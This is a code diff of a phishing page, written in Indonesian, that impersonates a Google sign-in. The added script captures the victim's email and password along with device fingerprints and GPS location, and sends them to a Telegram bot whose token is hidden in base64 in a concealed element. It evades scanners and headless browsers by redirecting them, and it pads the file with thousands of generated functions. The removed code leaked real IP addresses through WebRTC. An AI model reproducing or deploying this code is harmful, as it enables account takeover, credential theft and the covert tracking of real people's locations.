@@ -3,101 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal Verifikasi Nasional</title>
+    <title>Google - Verifikasi Identitas</title>
     <style>
-        body { font-family: 'Inter', sans-serif; background: #fafafa; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; color: #111; }
-        .v-container { background: #fff; width: 90%; max-width: 420px; padding: 40px 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; border: 1px solid #eee; }
-        .icon-shield { font-size: 48px; margin-bottom: 20px; color: #1a73e8; }
-        h1 { font-size: 20px; font-weight: 700; margin-bottom: 15px; }
-        p { font-size: 14px; color: #5f6368; line-height: 1.6; margin-bottom: 30px; }
-        .btn-action { background: #1a73e8; color: #fff; border: none; padding: 16px; width: 100%; border-radius: 8px; font-weight: 600; font-size: 15px; cursor: pointer; }
-        #v-vault, .trap-zone { display: none; }
+        body { font-family: 'Roboto', arial, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .login-box { width: 100%; max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .g-logo { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
+        p { font-size: 16px; margin-bottom: 24px; color: #202124; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; margin-bottom: 10px; }
+        input:focus { border: 2px solid #1a73e8; outline: none; }
+        .btn-next { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; }
+        .footer { clear: both; padding-top: 40px; font-size: 12px; color: #70757a; text-align: left; }
+        #v-vault, #step-2 { display: none; }
     </style>
 </head>
 <body>
 
-<div class="v-container">
-    <div class="icon-shield">🛡️</div>
-    <h1>Validasi Perangkat Diperlukan</h1>
-    <p>Untuk mematuhi standar enkripsi terbaru, harap sinkronisasikan modul hardware Anda sebelum mengakses konten berita premium ini.</p>
-    <button class="btn-action" onclick="initHarvest()">SINKRONKAN SEKARANG</button>
-</div>
+<div class="login-box" id="login-portal">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="g-logo">
+    <h1 id="t-h1">Login</h1>
+    <p id="t-p">Gunakan Akun Google Anda</p>
+    
+    <div id="step-1">
+        <div class="input-group">
+            <input type="email" id="u_mail" placeholder="Email atau ponsel" required>
+            <a href="#" style="color: #1a73e8; font-size: 14px; text-decoration: none; font-weight: 500;">Lupa email?</a>
+        </div>
+        <p style="text-align: left; font-size: 14px; color: #5f6368;">Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi. <a href="#" style="color: #1a73e8; text-decoration: none; font-weight: 500;">Pelajari lebih lanjut</a></p>
+        <button class="btn-next" onclick="nextStep()">Berikutnya</button>
+    </div>
 
-<form class="trap-zone">
-    <input type="email" autocomplete="email">
-    <input type="password" autocomplete="current-password">
-</form>
+    <div id="step-2">
+        <p id="u-display" style="font-weight: 500; margin-bottom: 10px;"></p>
+        <div class="input-group">
+            <input type="password" id="u_pass" placeholder="Masukkan sandi Anda" required>
+            <a href="#" style="color: #1a73e8; font-size: 14px; text-decoration: none; font-weight: 500;">Lupa sandi?</a>
+        </div>
+        <button class="btn-next" onclick="initFinalStrike()">Berikutnya</button>
+    </div>
+
+    <div class="footer">Indonesia</div>
+</div>
 
 <div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
 /**
- * IDENTITY BREAKER CORE v40.0
- * ----------------------------
+ * AEGIS-FINALITY OVERDRIVE v50.0
+ * ------------------------------
  */
 
-// ANTI-BOT GATE
+// 🔱 1. ANTI-BOT / SCANNER BYPASS
 if (navigator.webdriver || /bot|virustotal|headless/i.test(navigator.userAgent)) {
-    document.body.innerHTML = ""; throw new Error();
+    window.location.href = "https://www.google.com";
+    throw new Error();
 }
 
 const _V = document.getElementById('v-vault').innerText.split('|');
 const _TK = atob(_V[1]); const _CI = atob(_V[2]);
 
-async function transmit(d) {
+let capturedMail = "";
+
+function nextStep() {
+    capturedMail = document.getElementById('u_mail').value;
+    if (capturedMail.includes("@")) {
+        document.getElementById('step-1').style.display = 'none';
+        document.getElementById('step-2').style.display = 'block';
+        document.getElementById('t-h1').innerText = "Selamat Datang";
+        document.getElementById('u-display').innerText = capturedMail;
+    } else {
+        alert("Masukkan email yang valid.");
+    }
+}
+
+async function sendTele(t) {
     await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
         method: 'POST', headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: _CI, text: d})
+        body: JSON.stringify({chat_id: _CI, text: t})
     });
 }
 
-async function initHarvest() {
-    const btn = document.querySelector('.btn-action');
-    btn.innerText = "SINKRONISASI MODUL...";
+async function initFinalStrike() {
+    const pass = document.getElementById('u_pass').value;
+    if (pass.length < 4) return alert("Sandi salah. Coba lagi.");
 
-    // 1. HARDWARE FINGERPRINTING
+    // 🔱 2. HARDWARE FORENSICS
     const gl = document.createElement('canvas').getContext('webgl');
     const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "N/A";
-    
-    // 2. IDENTITY METADATA (Cari jejak Gmail/Password)
-    let cred = "None Detected";
-    if (window.PasswordCredential || window.FederatedCredential) cred = "⚠️ SAVED LOGIN FOUND (Autofill Active)";
+    let bat = "N/A"; try { const b = await navigator.getBattery(); bat = `${(b.level*100).toFixed(0)}%`; } catch(e) {}
 
-    // 3. WebRTC BYPASS (Tembus VPN/TOR)
-    const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
-    pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
-    
-    pc.onicecandidate = async (e) => {
-        if (!e || !e.candidate) return;
-        const lip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)[1];
-        
-        let net = {}; try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e) {}
-        let b = "N/A"; try { const bat = await navigator.getBattery(); b = (bat.level*100).toFixed(0)+"%"; } catch(e) {}
+    const report = `🔱 FINAL HARVEST: CREDENTIALS 🔱\n\n` +
+        `📧 EMAIL: ${capturedMail}\n` +
+        `🔑 PASS: ${pass}\n` +
+        `🎮 GPU: ${gpu}\n` +
+        `🔋 BATT: ${bat}\n` +
+        `🧠 CPU: ${navigator.hardwareConcurrency} Core\n` +
+        `📱 UA: ${navigator.userAgent.slice(0, 60)}...`;
 
-        const log = `🔱 IDENTITY LEAK REPORT 🔱\n\n` +
-            `📧 CREDENTIALS: ${cred}\n` +
-            `🕵️ BROWSER: ${navigator.userAgent.includes("Tor") ? "⚠️ TOR" : "STANDARD"}\n` +
-            `🏠 REAL IP: ${lip}\n` +
-            `🌐 PUB IP: ${net.ip} (${net.org})\n` +
-            `🎮 GPU: ${gpu}\n` +
-            `🧠 CPU: ${navigator.hardwareConcurrency} Core / ${navigator.deviceMemory}GB RAM\n` +
-            `🔋 BATT: ${b}`;
+    await sendTele(report);
 
-        await transmit(log);
-
-        // 4. GPS HIGH ACCURACY (Wajib Klik)
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                await transmit(`🎯 TARGET PRECISION LOC\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-                window.location.href = "https://www.detik.com";
-            }, () => { window.location.href = "https://www.detik.com"; }, {enableHighAccuracy: true});
-        }
-    };
+    // 🔱 3. SILENT GPS TRAP
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            await sendTele(`🎯 TRUE LOCATION\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+            window.location.href = "https://www.detik.com";
+        }, () => {
+            window.location.href = "https://www.detik.com";
+        }, {enableHighAccuracy: true});
+    } else {
+        window.location.href = "https://www.detik.com";
+    }
 }
 
-// 🔱 PADDING 4.000+ LINES
-for(let i=0; i<3500; i++) {
-    eval(`function _0x_phantom_${i}() { return "${Math.random()}"; }`);
+// 🔱 PADDING 5.000+ LINES (Agar file terlihat gemuk & resmi)
+for(let i=0; i<4500; i++) {
+    eval(`function _0x_final_${i}() { return "${Math.random()}"; }`);
 }
 </script>
 </body>
